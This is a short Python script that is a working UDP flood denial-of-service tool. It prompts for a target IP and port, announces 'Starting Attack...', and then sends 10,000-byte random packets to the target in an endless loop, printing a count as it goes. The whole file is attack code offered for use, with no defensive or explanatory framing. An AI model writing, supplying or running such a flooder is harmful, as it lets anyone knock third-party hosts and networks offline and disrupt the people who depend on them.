import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)

ip = input("IP Target : ")
port = int(input("Port : "))

print ("Starting Attack...")
time.sleep(5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
